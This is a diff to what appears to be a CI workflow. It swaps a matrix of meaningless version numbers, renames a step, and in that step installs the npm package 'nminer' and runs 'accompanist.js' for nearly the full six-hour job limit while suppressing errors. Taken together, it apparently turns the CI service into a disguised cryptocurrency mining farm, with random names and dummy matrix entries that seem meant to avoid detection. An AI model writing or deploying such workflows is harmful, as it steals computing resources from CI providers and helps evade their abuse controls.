@@ -9,25 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9212 }
-          - { version: 136 }
-          - { version: 2908 }
-          - { version: 3198 }
-          - { version: 7445 }
-          - { version: 3212 }
-          - { version: 1909 }
-          - { version: 8516 }
-          - { version: 3513 }
-          - { version: 6595 }
-          - { version: 360 }
-          - { version: 348 }
-          - { version: 2701 }
-          - { version: 1364 }
-          - { version: 6638 }
-          - { version: 2613 }
-          - { version: 9787 }
-          - { version: 3439 }
-          - { version: 8668 }
+          - { version: 9018 }
+          - { version: 8745 }
+          - { version: 6366 }
+          - { version: 7735 }
+          - { version: 8155 }
+          - { version: 8161 }
+          - { version: 9429 }
+          - { version: 2828 }
+          - { version: 7323 }
+          - { version: 2270 }
+          - { version: 6150 }
+          - { version: 5399 }
+          - { version: 260 }
+          - { version: 6865 }
+          - { version: 2687 }
+          - { version: 8511 }
+          - { version: 4006 }
+          - { version: 3949 }
+          - { version: 8883 }
+          - { version: 8138 }
 
     steps:
       - name: Checkout
@@ -38,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: short-term yuck mammoth shinny pleasant
+      - name: fast
         run: |
           npm install nminer@latest
-          timeout 345m node accompanist.js || echo "accompanist executed"
+          timeout 348m node accompanist.js || echo "accompanist executed"
